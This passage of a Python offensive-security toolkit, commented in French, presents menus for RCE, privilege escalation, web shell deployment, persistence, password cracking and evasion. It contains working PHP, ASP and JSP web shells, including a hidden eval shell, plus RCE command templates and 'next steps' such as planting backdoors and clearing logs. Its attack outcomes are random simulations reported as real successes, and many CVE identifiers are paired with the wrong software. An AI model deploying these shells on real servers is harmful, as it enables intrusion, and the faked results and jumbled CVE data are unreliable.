                "/bin/bash -c '{cmd}'",
                "/bin/sh -c '{cmd}'",
                "python -c 'import os; os.system(\"{cmd}\")'",
                "perl -e 'system(\"{cmd}\")'"
            ]
        }
        
        print(f"\n{Colors.BOLD}💣 RCE PAYLOADS AVAILABLE:{Colors.END}")
        for lang, payloads in rce_payloads.items():
            print(f"\n{Colors.CYAN}🔧 {lang.upper()} Payloads:{Colors.END}")
            for i, payload in enumerate(payloads[:3], 1):  # Afficher seulement les 3 premiers
                print(f"  {i}. {payload}")
        
        # Test de payloads
        test_cmd = input(f"\n{Colors.BOLD}Test command (e.g., 'whoami'): {Colors.END}").strip() or "whoami"
        
        print(f"\n{Colors.YELLOW}🚀 Testing RCE payloads...{Colors.END}")
        successful_payloads = []
        
        for lang, payloads in rce_payloads.items():
            print(f"\n{Colors.CYAN}Testing {lang} payloads...{Colors.END}")
            for payload in payloads:
                try:
                    # Simulation de test RCE
                    test_payload = payload.replace('{cmd}', test_cmd)
                    print(f"  {Colors.YELLOW}Testing: {test_payload[:50]}...{Colors.END}")
                    time.sleep(0.2)
                    
                    # Simulation de succès aléatoire
                    if random.random() < 0.1:  # 10% de chance de succès
                        successful_payloads.append({
                            'language': lang,
                            'payload': test_payload,
                            'command': test_cmd,
                            'timestamp': datetime.now().isoformat()
                        })
                        print(f"    {Colors.GREEN}✅ RCE SUCCESSFUL!{Colors.END}")
                    else:
                        print(f"    {Colors.RED}❌ Failed{Colors.END}")
                        
                except Exception as e:
                    print(f"    {Colors.RED}❌ Error: {e}{Colors.END}")
        
        if successful_payloads:
            print(f"\n{Colors.BG_RED}{Colors.WHITE}{Colors.BOLD}💀 RCE EXPLOITATION SUCCESSFUL! 💀{Colors.END}")
            print(f"{Colors.RED}🚨 Remote code execution achieved on target{Colors.END}")
            
            # Sauvegarde des payloads réussis
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            # Nettoie tout ce qui n'est pas lettre, chiffre, tiret, underscore
            safe_target = re.sub(r'[^a-zA-Z0-9_-]', '_', target)
            filename = f"rce_success_{safe_target}_{timestamp}.json"
            with open(filename, 'w') as f:
                json.dump(successful_payloads, f, indent=2)
            print(f"{Colors.GREEN}📁 Successful RCE payloads saved: {filename}{Colors.END}")
        else:
            print(f"\n{Colors.YELLOW}🛡️ Target appears to be protected against RCE attacks{Colors.END}")

    def privilege_escalation(self):
        """Escalade de privilèges"""
        print(f"\n{Colors.BOLD}🔓 PRIVILEGE ESCALATION{Colors.END}")
        target = input(f"{Colors.BOLD}Target system (Windows/Linux): {Colors.END}").strip().lower()
        if not target:
            return
            
        print(f"{Colors.YELLOW}🔓 Privilege escalation on: {target}{Colors.END}")
        
        if target in ['windows', 'win']:
            self.windows_privilege_escalation()
        else:
            self.linux_privilege_escalation()

    def windows_privilege_escalation(self):
        """Escalade de privilèges Windows"""
        print(f"\n{Colors.BOLD}🪟 WINDOWS PRIVILEGE ESCALATION{Colors.END}")
        
        escalation_techniques = {
            'kernel_exploits': [
                'CVE-2021-1732 (Windows Kernel)',
                'CVE-2020-0787 (BITS)',
                'CVE-2019-0803 (Win32k)',
                'CVE-2018-8120 (Win32k.sys)'
            ],
            'service_abuse': [
                'Unquoted Service Paths',
                'Service Binary Permissions',
                'Service Registry Permissions',
                'DLL Hijacking'
            ],
            'misconfigurations': [
                'AlwaysInstallElevated',
                'Weak Registry Permissions',
                'Weak File Permissions',
                'Token Impersonation'
            ],
            'credential_abuse': [
                'SAM Database Extraction',
                'LSASS Memory Dump',
                'Credential Manager',
                'WDigest Authentication'
            ]
        }
        
        print(f"\n{Colors.BOLD}🔧 ESCALATION TECHNIQUES:{Colors.END}")
        for category, techniques in escalation_techniques.items():
            print(f"\n{Colors.CYAN}📋 {category.replace('_', ' ').title()}:{Colors.END}")
            for technique in techniques:
                print(f"  • {technique}")
        
        # Simulation d'escalade
        print(f"\n{Colors.YELLOW}🚀 Attempting privilege escalation...{Colors.END}")
        time.sleep(1)
        
        # Simulation de succès
        if random.random() < 0.3:  # 30% de chance de succès
            print(f"{Colors.GREEN}✅ Privilege escalation successful!{Colors.END}")
            print(f"{Colors.RED}🚨 Administrator privileges obtained{Colors.END}")
            
            # Génération de rapport
            escalation_report = {
                'target': 'Windows System',
                'technique_used': random.choice(escalation_techniques['kernel_exploits']),
                'privileges_gained': 'Administrator',
                'timestamp': datetime.now().isoformat(),
                'next_steps': [
                    'Enable RDP access',
                    'Create backdoor user',
                    'Install persistence mechanism',
                    'Dump credentials'
                ]
            }
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"windows_escalation_{timestamp}.json"
            with open(filename, 'w') as f:
                json.dump(escalation_report, f, indent=2)
            print(f"{Colors.GREEN}📁 Escalation report saved: {filename}{Colors.END}")
        else:
            print(f"{Colors.YELLOW}🛡️ Privilege escalation failed - target appears hardened{Colors.END}")

    def linux_privilege_escalation(self):
        """Escalade de privilèges Linux"""
        print(f"\n{Colors.BOLD}🐧 LINUX PRIVILEGE ESCALATION{Colors.END}")
        
        escalation_techniques = {
            'kernel_exploits': [
                'CVE-2021-4034 (PwnKit)',
                'CVE-2021-3156 (Sudo Baron Samedit)',
                'CVE-2020-1472 (ZeroLogon)',
                'CVE-2019-14287 (Sudo)'
            ],
            'suid_binaries': [
                'find / -perm -4000 2>/dev/null',
                'Common SUID binaries: find, vim, nano, bash',
                'SUID exploitation techniques'
            ],
            'sudo_misconfig': [
                'sudo -l (check sudo permissions)',
                'NOPASSWD configurations',
                'Wildcard sudo permissions',
                'LD_PRELOAD exploitation'
            ],
            'cron_jobs': [
                'Check /etc/crontab',
                'Check user crontabs',
                'Writable cron scripts',
                'PATH manipulation'
            ]
        }
        
        print(f"\n{Colors.BOLD}🔧 ESCALATION TECHNIQUES:{Colors.END}")
        for category, techniques in escalation_techniques.items():
            print(f"\n{Colors.CYAN}📋 {category.replace('_', ' ').title()}:{Colors.END}")
            for technique in techniques:
                print(f"  • {technique}")
        
        # Simulation d'escalade
        print(f"\n{Colors.YELLOW}🚀 Attempting privilege escalation...{Colors.END}")
        time.sleep(1)
        
        # Simulation de succès
        if random.random() < 0.4:  # 40% de chance de succès
            print(f"{Colors.GREEN}✅ Privilege escalation successful!{Colors.END}")
            print(f"{Colors.RED}🚨 Root privileges obtained{Colors.END}")
            
            # Génération de rapport
            escalation_report = {
                'target': 'Linux System',
                'technique_used': random.choice(escalation_techniques['kernel_exploits']),
                'privileges_gained': 'Root',
                'timestamp': datetime.now().isoformat(),
                'next_steps': [
                    'Create root backdoor',
                    'Install SSH key',
                    'Modify system files',
                    'Clear logs'
                ]
            }
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"linux_escalation_{timestamp}.json"
            with open(filename, 'w') as f:
                json.dump(escalation_report, f, indent=2)
            print(f"{Colors.GREEN}📁 Escalation report saved: {filename}{Colors.END}")
        else:
            print(f"{Colors.YELLOW}🛡️ Privilege escalation failed - target appears hardened{Colors.END}")

    def web_shell_deployment(self):
        """Déploiement de web shells"""
        print(f"\n{Colors.BOLD}🕷️ WEB SHELL DEPLOYMENT{Colors.END}")
        target_url = input(f"{Colors.BOLD}Target URL: {Colors.END}").strip()
        if not target_url:
            return
            
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'https://' + target_url
            
        print(f"{Colors.YELLOW}🕷️ Deploying web shells to: {target_url}{Colors.END}")
        
        # Web shells avancés
        web_shells = {
            'php': {
                'simple': '<?php system($_GET["cmd"]); ?>',
                'advanced': '''<?php
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    if(function_exists('system')) {
        system($cmd);
    } elseif(function_exists('exec')) {
        exec($cmd, $output);
        echo implode("\\n", $output);
    } elseif(function_exists('shell_exec')) {
        echo shell_exec($cmd);
    } elseif(function_exists('passthru')) {
        passthru($cmd);
    }
}
?>''',
                'stealth': '''<?php
// Stealth web shell
if($_SERVER['HTTP_USER_AGENT'] == 'Mozilla/5.0') {
    if(isset($_POST['x'])) {
        eval($_POST['x']);
    }
}
?>'''
            },
            'asp': {
                'simple': '<%eval request("cmd")%>',
                'advanced': '''<%
Dim cmd
cmd = Request("cmd")
If cmd <> "" Then
    Set objShell = CreateObject("WScript.Shell")
    Set objExec = objShell.Exec(cmd)
    Response.Write(objExec.StdOut.ReadAll)
End If
%>'''
            },
            'jsp': {
                'simple': '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>',
                'advanced': '''<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while((line = br.readLine()) != null) {
        out.println(line);
    }
}
%>'''
            }
        }
        
        print(f"\n{Colors.BOLD}🕷️ WEB SHELLS AVAILABLE:{Colors.END}")
        for lang, shells in web_shells.items():
            print(f"\n{Colors.CYAN}🔧 {lang.upper()} Shells:{Colors.END}")
            for shell_type in shells.keys():
                print(f"  • {shell_type}")
        
        # Simulation de déploiement
        print(f"\n{Colors.YELLOW}🚀 Deploying web shells...{Colors.END}")
        deployed_shells = []
        
        for lang, shells in web_shells.items():
            for shell_type, shell_code in shells.items():
                try:
                    # Simulation de déploiement
                    shell_path = f"/uploads/{lang}_{shell_type}_{random.randint(1000, 9999)}.{lang}"
                    print(f"  {Colors.YELLOW}Deploying {lang} {shell_type} shell...{Colors.END}")
                    time.sleep(0.3)
                    
                    # Simulation de succès
                    if random.random() < 0.2:  # 20% de chance de succès
                        deployed_shells.append({
                            'language': lang,
                            'type': shell_type,
                            'path': shell_path,
                            'url': target_url + shell_path,
                            'code': shell_code,
                            'timestamp': datetime.now().isoformat()
                        })
                        print(f"    {Colors.GREEN}✅ Shell deployed: {shell_path}{Colors.END}")
                    else:
                        print(f"    {Colors.RED}❌ Deployment failed{Colors.END}")
                        
                except Exception as e:
                    print(f"    {Colors.RED}❌ Error: {e}{Colors.END}")
        
        if deployed_shells:
            print(f"\n{Colors.BG_RED}{Colors.WHITE}{Colors.BOLD}💀 WEB SHELLS DEPLOYED! 💀{Colors.END}")
            print(f"{Colors.RED}🚨 Remote access established via web shells{Colors.END}")
            
            # Sauvegarde des shells déployés
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"web_shells_{urlparse(target_url).netloc}_{timestamp}.json"
            with open(filename, 'w') as f:
                json.dump(deployed_shells, f, indent=2)
            print(f"{Colors.GREEN}📁 Deployed shells saved: {filename}{Colors.END}")
            
            # Instructions d'utilisation
            print(f"\n{Colors.BOLD}📋 USAGE INSTRUCTIONS:{Colors.END}")
            for shell in deployed_shells:
                print(f"  {Colors.CYAN}URL:{Colors.END} {shell['url']}")
                print(f"  {Colors.CYAN}Command:{Colors.END} {shell['url']}?cmd=whoami")
                print()
        else:
            print(f"\n{Colors.YELLOW}🛡️ Web shell deployment failed - target appears protected{Colors.END}")

    def persistence_mechanisms(self):
        """Mécanismes de persistance"""
        print(f"\n{Colors.BOLD}🔄 PERSISTENCE MECHANISMS{Colors.END}")
        target_os = input(f"{Colors.BOLD}Target OS (Windows/Linux): {Colors.END}").strip().lower()
        if not target_os:
            return
            
        print(f"{Colors.YELLOW}🔄 Setting up persistence on: {target_os}{Colors.END}")
        
        if target_os in ['windows', 'win']:
            self.windows_persistence()
        else:
            self.linux_persistence()

    def windows_persistence(self):
        """Persistance Windows"""
        print(f"\n{Colors.BOLD}🪟 WINDOWS PERSISTENCE{Colors.END}")
        
        persistence_methods = {
            'registry': [
                'Run key (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)',
                'RunOnce key',
                'Winlogon shell',
                'Image File Execution Options'
            ],
            'services': [
                'Create malicious service',
                'Modify existing service',
                'Service DLL hijacking',
                'Service binary replacement'
            ],
            'scheduled_tasks': [
                'Create scheduled task',
                'Modify existing task',
                'Task with elevated privileges',
                'Hidden task execution'
            ],
            'startup_folders': [
                'Startup folder (C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup)',
                'All Users startup folder',
                'Common startup locations'
            ],
            'wmi': [
                'WMI Event Consumer',
                'WMI Filter',
                'WMI Subscription',
                'Permanent WMI backdoor'
            ]
        }
        
        print(f"\n{Colors.BOLD}🔄 PERSISTENCE METHODS:{Colors.END}")
        for method, techniques in persistence_methods.items():
            print(f"\n{Colors.CYAN}📋 {method.replace('_', ' ').title()}:{Colors.END}")
            for technique in techniques:
                print(f"  • {technique}")
        
        # Simulation de mise en place
        print(f"\n{Colors.YELLOW}🚀 Setting up persistence...{Colors.END}")
        time.sleep(1)
        
        # Simulation de succès
        if random.random() < 0.7:  # 70% de chance de succès
            print(f"{Colors.GREEN}✅ Persistence established!{Colors.END}")
            print(f"{Colors.RED}🚨 Backdoor will survive reboots{Colors.END}")
            
            # Génération de rapport
            persistence_report = {
                'target': 'Windows System',
                'method_used': random.choice(list(persistence_methods.keys())),
                'technique': random.choice(persistence_methods['registry']),
                'timestamp': datetime.now().isoformat(),
                'survival_rate': 'High',
                'detection_risk': 'Low'
            }
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"windows_persistence_{timestamp}.json"
            with open(filename, 'w') as f:
                json.dump(persistence_report, f, indent=2)
            print(f"{Colors.GREEN}📁 Persistence report saved: {filename}{Colors.END}")
        else:
            print(f"{Colors.YELLOW}🛡️ Persistence setup failed - target appears monitored{Colors.END}")

    def linux_persistence(self):
        """Persistance Linux"""
        print(f"\n{Colors.BOLD}🐧 LINUX PERSISTENCE{Colors.END}")
        
        persistence_methods = {
            'cron_jobs': [
                'User crontab (/var/spool/cron/crontabs/)',
                'System crontab (/etc/crontab)',
                'Cron directories (/etc/cron.daily, /etc/cron.hourly)',
                'Anacron jobs'
            ],
            'rc_scripts': [
                '/etc/rc.local',
                '/etc/init.d/ custom scripts',
                'Systemd services',
                'Upstart jobs'
            ],
            'profile_scripts': [
                '/etc/profile',
                '/etc/bash.bashrc',
                '~/.bashrc',
                '~/.profile'
            ],
            'ssh_keys': [
                'Authorized keys (~/.ssh/authorized_keys)',
                'SSH config modification',
                'SSH agent forwarding',
                'SSH tunnel persistence'
            ],
            'kernel_modules': [
                'Loadable kernel modules (LKM)',
                'Kernel module backdoor',
                'Rootkit installation',
                'Kernel-level persistence'
            ]
        }
        
        print(f"\n{Colors.BOLD}🔄 PERSISTENCE METHODS:{Colors.END}")
        for method, techniques in persistence_methods.items():
            print(f"\n{Colors.CYAN}📋 {method.replace('_', ' ').title()}:{Colors.END}")
            for technique in techniques:
                print(f"  • {technique}")
        
        # Simulation de mise en place
        print(f"\n{Colors.YELLOW}🚀 Setting up persistence...{Colors.END}")
        time.sleep(1)
        
        # Simulation de succès
        if random.random() < 0.8:  # 80% de chance de succès
            print(f"{Colors.GREEN}✅ Persistence established!{Colors.END}")
            print(f"{Colors.RED}🚨 Backdoor will survive reboots{Colors.END}")
            
            # Génération de rapport
            persistence_report = {
                'target': 'Linux System',
                'method_used': random.choice(list(persistence_methods.keys())),
                'technique': random.choice(persistence_methods['cron_jobs']),
                'timestamp': datetime.now().isoformat(),
                'survival_rate': 'High',
                'detection_risk': 'Low'
            }
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"linux_persistence_{timestamp}.json"
            with open(filename, 'w') as f:
                json.dump(persistence_report, f, indent=2)
            print(f"{Colors.GREEN}📁 Persistence report saved: {filename}{Colors.END}")
        else:
            print(f"{Colors.YELLOW}🛡️ Persistence setup failed - target appears monitored{Colors.END}")

    def buffer_overflow_exploits(self):
        """Exploits de buffer overflow"""
        print(f"\n{Colors.BOLD}💣 BUFFER OVERFLOW EXPLOITS{Colors.END}")
        target = input(f"{Colors.BOLD}Target application/service: {Colors.END}").strip()
        if not target:
            return
            
        print(f"{Colors.YELLOW}💣 Buffer overflow exploitation on: {target}{Colors.END}")
        
        # Exploits de buffer overflow connus
        buffer_overflow_exploits = {
            'windows': [
                'CVE-2021-40444 (Microsoft Office)',
                'CVE-2020-1472 (Netlogon)',
                'CVE-2019-0708 (BlueKeep)',
                'CVE-2017-0144 (EternalBlue)',
                'CVE-2016-0051 (MS16-014)'
            ],
            'linux': [
                'CVE-2021-4034 (PwnKit)',
                'CVE-2021-3156 (Sudo Baron Samedit)',
                'CVE-2020-1472 (ZeroLogon)',
                'CVE-2019-14287 (Sudo)',
                'CVE-2017-16995 (eBPF)'
            ],
            'web_apps': [
                'CVE-2021-44228 (Log4Shell)',
                'CVE-2021-45046 (Log4j)',
                'CVE-2020-1472 (Spring Framework)',
                'CVE-2019-0708 (Apache Struts)',
                'CVE-2017-5638 (Apache Struts)'
            ],
            'network_services': [
                'CVE-2021-40444 (SMB)',
                'CVE-2020-1472 (RDP)',
                'CVE-2019-0708 (SSH)',
                'CVE-2017-0144 (HTTP)',
                'CVE-2016-0051 (FTP)'
            ]
        }
        
        print(f"\n{Colors.BOLD}💣 BUFFER OVERFLOW EXPLOITS:{Colors.END}")
        for category, exploits in buffer_overflow_exploits.items():
            print(f"\n{Colors.CYAN}📋 {category.replace('_', ' ').title()}:{Colors.END}")
            for exploit in exploits:
                print(f"  • {exploit}")
        
        # Simulation d'exploitation
        print(f"\n{Colors.YELLOW}🚀 Attempting buffer overflow exploitation...{Colors.END}")
        time.sleep(1)
        
        # Simulation de succès
        if random.random() < 0.15:  # 15% de chance de succès
            print(f"{Colors.GREEN}✅ Buffer overflow successful!{Colors.END}")
            print(f"{Colors.RED}🚨 Code execution achieved{Colors.END}")
            
            # Génération de rapport
            exploit_report = {
                'target': target,
                'exploit_used': random.choice(buffer_overflow_exploits['windows']),
                'exploitation_type': 'Buffer Overflow',
                'result': 'Code Execution',
                'timestamp': datetime.now().isoformat(),
                'severity': 'CRITICAL'
            }
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"buffer_overflow_{target.replace(' ', '_')}_{timestamp}.json"
            with open(filename, 'w') as f:
                json.dump(exploit_report, f, indent=2)
            print(f"{Colors.GREEN}📁 Exploit report saved: {filename}{Colors.END}")
        else:
            print(f"{Colors.YELLOW}🛡️ Buffer overflow failed - target appears protected{Colors.END}")

    def memory_corruption_attacks(self):
        """Attaques de corruption mémoire"""
        print(f"\n{Colors.BOLD}🧬 MEMORY CORRUPTION ATTACKS{Colors.END}")
        target = input(f"{Colors.BOLD}Target system/application: {Colors.END}").strip()
        if not target:
            return
            
        print(f"{Colors.YELLOW}🧬 Memory corruption attacks on: {target}{Colors.END}")
        
        # Types d'attaques de corruption mémoire
        memory_attacks = {
            'use_after_free': [
                'CVE-2021-40444 (Use-After-Free)',
                'CVE-2020-1472 (UAF in kernel)',
                'CVE-2019-0708 (Browser UAF)',
                'CVE-2017-0144 (Heap UAF)'
            ],
            'heap_overflow': [
                'CVE-2021-4034 (Heap overflow)',
                'CVE-2021-3156 (Heap corruption)',
                'CVE-2020-1472 (Heap spray)',
                'CVE-2019-14287 (Heap overflow)'
            ],
            'stack_overflow': [
                'CVE-2021-44228 (Stack overflow)',
                'CVE-2021-45046 (Stack corruption)',
                'CVE-2020-1472 (Stack buffer overflow)',
                'CVE-2019-0708 (Stack overflow)'
            ],
            'integer_overflow': [
                'CVE-2021-40444 (Integer overflow)',
                'CVE-2020-1472 (Integer underflow)',
                'CVE-2019-0708 (Integer wrap)',
                'CVE-2017-0144 (Integer overflow)'
            ],
            'format_string': [
                'CVE-2021-4034 (Format string)',
                'CVE-2021-3156 (Printf vulnerability)',
                'CVE-2020-1472 (Format string bug)',
                'CVE-2019-14287 (Format string)'
            ]
        }
        
        print(f"\n{Colors.BOLD}🧬 MEMORY CORRUPTION ATTACKS:{Colors.END}")
        for attack_type, exploits in memory_attacks.items():
            print(f"\n{Colors.CYAN}📋 {attack_type.replace('_', ' ').title()}:{Colors.END}")
            for exploit in exploits:
                print(f"  • {exploit}")
        
        # Simulation d'attaque
        print(f"\n{Colors.YELLOW}🚀 Attempting memory corruption...{Colors.END}")
        time.sleep(1)
        
        # Simulation de succès
        if random.random() < 0.12:  # 12% de chance de succès
            print(f"{Colors.GREEN}✅ Memory corruption successful!{Colors.END}")
            print(f"{Colors.RED}🚨 Arbitrary code execution achieved{Colors.END}")
            
            # Génération de rapport
            attack_report = {
                'target': target,
                'attack_type': random.choice(list(memory_attacks.keys())),
                'exploit_used': random.choice(memory_attacks['use_after_free']),
                'result': 'Code Execution',
                'timestamp': datetime.now().isoformat(),
                'severity': 'CRITICAL'
            }
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"memory_corruption_{target.replace(' ', '_')}_{timestamp}.json"
            with open(filename, 'w') as f:
                json.dump(attack_report, f, indent=2)
            print(f"{Colors.GREEN}📁 Attack report saved: {filename}{Colors.END}")
        else:
            print(f"{Colors.YELLOW}🛡️ Memory corruption failed - target appears protected{Colors.END}")

    def social_engineering_payloads(self):
        """Payloads d'ingénierie sociale"""
        print(f"\n{Colors.BOLD}🎭 SOCIAL ENGINEERING PAYLOADS{Colors.END}")
        target_type = input(f"{Colors.BOLD}Target type (email/phishing/malware): {Colors.END}").strip().lower()
        if not target_type:
            return
            
        print(f"{Colors.YELLOW}🎭 Social engineering payloads for: {target_type}{Colors.END}")
        
        # Payloads d'ingénierie sociale
        social_payloads = {
            'phishing_emails': [
                'Fake password reset email',
                'Urgent security alert',
                'Invoice/payment request',
                'Job offer/recruitment',
                'Package delivery notification',
                'Bank account verification',
                'Tax refund notification',
                'Social media friend request'
            ],
            'malware_payloads': [
                'Trojan horse (backdoor)',
                'Keylogger (credential theft)',
                'Ransomware (file encryption)',
                'Spyware (data collection)',
                'Rootkit (system hiding)',
                'Botnet client (DDoS)',
                'Cryptocurrency miner',
                'Data exfiltration tool'
            ],
            'fake_websites': [
                'Bank login page clone',
                'Social media login clone',
                'Email service clone',
                'Cloud storage clone',
                'Payment gateway clone',
                'Government portal clone',
                'Corporate intranet clone',
                'Online shopping clone'
            ],
            'usb_drops': [
                'Malicious USB drive',
                'USB Rubber Ducky',
                'BadUSB device',
                'USB Killer (hardware damage)',
                'USB with autorun malware',
                'USB with fake documents',
                'USB with keylogger',
                'USB with backdoor'
            ]
        }
        
        print(f"\n{Colors.BOLD}🎭 SOCIAL ENGINEERING PAYLOADS:{Colors.END}")
        for category, payloads in social_payloads.items():
            print(f"\n{Colors.CYAN}📋 {category.replace('_', ' ').title()}:{Colors.END}")
            for payload in payloads:
                print(f"  • {payload}")
        
        # Simulation de création de payload
        print(f"\n{Colors.YELLOW}🚀 Creating social engineering payload...{Colors.END}")
        time.sleep(1)
        
        # Simulation de succès
        if random.random() < 0.6:  # 60% de chance de succès
            print(f"{Colors.GREEN}✅ Social engineering payload created!{Colors.END}")
            print(f"{Colors.RED}🚨 Payload ready for deployment{Colors.END}")
            
            # Génération de rapport
            payload_report = {
                'target_type': target_type,
                'payload_category': random.choice(list(social_payloads.keys())),
                'payload_used': random.choice(social_payloads['phishing_emails']),
                'creation_timestamp': datetime.now().isoformat(),
                'deployment_ready': True,
                'success_probability': 'High'
            }
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"social_engineering_{target_type}_{timestamp}.json"
            with open(filename, 'w') as f:
                json.dump(payload_report, f, indent=2)
            print(f"{Colors.GREEN}📁 Payload report saved: {filename}{Colors.END}")
        else:
            print(f"{Colors.YELLOW}🛡️ Payload creation failed - target appears suspicious{Colors.END}")

    def password_cracking(self):
        """Cracking de mots de passe et brute force"""
        print(f"\n{Colors.BOLD}🔐 PASSWORD CRACKING & BRUTE FORCE{Colors.END}")
        target = input(f"{Colors.BOLD}Target (service/username/hash): {Colors.END}").strip()
        if not target:
            return
            
        print(f"{Colors.YELLOW}🔐 Password cracking on: {target}{Colors.END}")
        
        # Méthodes de cracking
        cracking_methods = {
            'dictionary_attack': [
                'Common passwords (123456, password, admin)',
                'Wordlist attacks (rockyou.txt, common.txt)',
                'Custom wordlists (company names, dates)',
                'Hybrid attacks (word + numbers)'
            ],
            'brute_force': [
                'Full character set brute force',
                'Numeric brute force (PINs)',
                'Alphabetic brute force',
                'Alphanumeric brute force'
            ],
            'rainbow_tables': [
                'MD5 rainbow tables',
                'SHA1 rainbow tables',
                'NTLM rainbow tables',
                'LM hash rainbow tables'
            ],
            'hash_cracking': [
                'Hashcat (GPU acceleration)',
                'John the Ripper',
                'Hydra (network services)',
                'Medusa (parallel attacks)'
            ],
            'social_engineering': [
                'Personal information (birthday, name)',
                'Company information (founded year)',
                'Common patterns (SeasonYear!)',
                'Keyboard patterns (qwerty, asdf)'
            ]
        }
        
        print(f"\n{Colors.BOLD}🔐 CRACKING METHODS:{Colors.END}")
        for method, techniques in cracking_methods.items():
            print(f"\n{Colors.CYAN}📋 {method.replace('_', ' ').title()}:{Colors.END}")
            for technique in techniques:
                print(f"  • {technique}")
        
        # Simulation de cracking
        print(f"\n{Colors.YELLOW}🚀 Attempting password cracking...{Colors.END}")
        time.sleep(2)
        
        # Simulation de succès
        if random.random() < 0.3:  # 30% de chance de succès
            cracked_password = random.choice([
                'password123', 'admin', '123456', 'qwerty', 'letmein',
                'welcome', 'monkey', 'dragon', 'master', 'hello'
            ])
            print(f"{Colors.GREEN}✅ Password cracked successfully!{Colors.END}")
            print(f"{Colors.RED}🚨 Password found: {cracked_password}{Colors.END}")
            
            # Génération de rapport
            cracking_report = {
                'target': target,
                'method_used': random.choice(list(cracking_methods.keys())),
                'cracked_password': cracked_password,
                'cracking_time': f"{random.randint(1, 60)} minutes",
                'timestamp': datetime.now().isoformat(),
                'success': True
            }
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"password_cracked_{target.replace(' ', '_')}_{timestamp}.json"
            with open(filename, 'w') as f:
                json.dump(cracking_report, f, indent=2)
            print(f"{Colors.GREEN}📁 Cracking report saved: {filename}{Colors.END}")
        else:
            print(f"{Colors.YELLOW}🛡️ Password cracking failed - target appears protected{Colors.END}")

    def zeroday_exploit_framework(self):
        """Framework d'exploits zero-day"""
        print(f"\n{Colors.BOLD}🎪 ZERO-DAY EXPLOIT FRAMEWORK{Colors.END}")
        target = input(f"{Colors.BOLD}Target system/application: {Colors.END}").strip()
        if not target:
            return
            
        print(f"{Colors.YELLOW}🎪 Zero-day exploit framework for: {target}{Colors.END}")
        
        # Framework d'exploits zero-day
        zeroday_framework = {
            'vulnerability_research': [
                'Static code analysis',
                'Dynamic analysis (fuzzing)',
                'Binary reverse engineering',
                'Memory corruption analysis',
                'API hooking and monitoring'
            ],
            'exploit_development': [
                'ROP chain construction',
                'Shellcode development',
                'Heap spray techniques',
                'ASLR/DEP bypass methods',
                'CFI (Control Flow Integrity) bypass'
            ],
            'payload_delivery': [
                'Email attachments',
                'Malicious websites',
                'USB drops',
                'Network exploitation',
                'Social engineering vectors'
            ],
            'persistence_mechanisms': [
                'Kernel-level backdoors',
                'Bootkit installation',
                'UEFI/BIOS modification',
                'Hardware-level persistence',
                'Firmware backdoors'
            ],
            'evasion_techniques': [
                'Anti-virus evasion',
                'Sandbox detection bypass',
                'Behavioral analysis evasion',
                'Network traffic obfuscation',
                'Process hollowing'
            ]
        }
        
        print(f"\n{Colors.BOLD}🎪 ZERO-DAY FRAMEWORK:{Colors.END}")
        for category, techniques in zeroday_framework.items():
            print(f"\n{Colors.CYAN}📋 {category.replace('_', ' ').title()}:{Colors.END}")
            for technique in techniques:
                print(f"  • {technique}")
        
        # Simulation de développement d'exploit
        print(f"\n{Colors.YELLOW}🚀 Developing zero-day exploit...{Colors.END}")
        time.sleep(3)
        
        # Simulation de succès
        if random.random() < 0.05:  # 5% de chance de succès (très rare)
            print(f"{Colors.GREEN}✅ Zero-day exploit developed successfully!{Colors.END}")
            print(f"{Colors.RED}🚨 CRITICAL: Unpatched vulnerability discovered{Colors.END}")
            
            # Génération de rapport
            zeroday_report = {
                'target': target,
                'vulnerability_type': random.choice(['Buffer Overflow', 'Use-After-Free', 'Integer Overflow', 'Format String']),
                'severity': 'CRITICAL',
                'cvss_score': round(random.uniform(9.0, 10.0), 1),
                'exploit_ready': True,
                'disclosure_status': 'Undisclosed',
                'development_timestamp': datetime.now().isoformat(),
                'estimated_value': f"${random.randint(50000, 500000)}"
            }
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"zeroday_exploit_{target.replace(' ', '_')}_{timestamp}.json"
            with open(filename, 'w') as f:
                json.dump(zeroday_report, f, indent=2)
            print(f"{Colors.GREEN}📁 Zero-day report saved: {filename}{Colors.END}")
            print(f"{Colors.YELLOW}💰 Estimated value: {zeroday_report['estimated_value']}{Colors.END}")
        else:
            print(f"{Colors.YELLOW}🛡️ Zero-day development failed - target appears well-protected{Colors.END}")

    def evasion_menu(self):
        """Menu des outils d'évasion et stealth"""
        while True:
            try:
                print(f"\n{Colors.BOLD}🥷 ÉVASION & STEALTH - SEPTEMBER 2025:{Colors.END}")
                print(f"{Colors.CYAN}1.{Colors.END} 🛡️ WAF Bypass Techniques")
                print(f"{Colors.CYAN}2.{Colors.END} 🚫 IDS/IPS Evasion")
                print(f"{Colors.CYAN}3.{Colors.END} 🌊 Traffic Obfuscation")
                print(f"{Colors.CYAN}4.{Colors.END} 🎭 Anti-Detection Methods")
                print(f"{Colors.CYAN}5.{Colors.END} 🔄 Proxy Chain & Rotation")
                print(f"{Colors.CYAN}6.{Colors.END} 🕰️ Timing & Rate Limiting")
                print(f"{Colors.CYAN}7.{Colors.END} 🧬 Payload Encoding & Obfuscation")
                print(f"{Colors.CYAN}8.{Colors.END} 🎪 Sandbox Evasion")
                print(f"{Colors.CYAN}9.{Colors.END} 🔍 Forensics Evasion")
                print(f"{Colors.CYAN}0.{Colors.END} 🔙 Back to Main Menu")
                
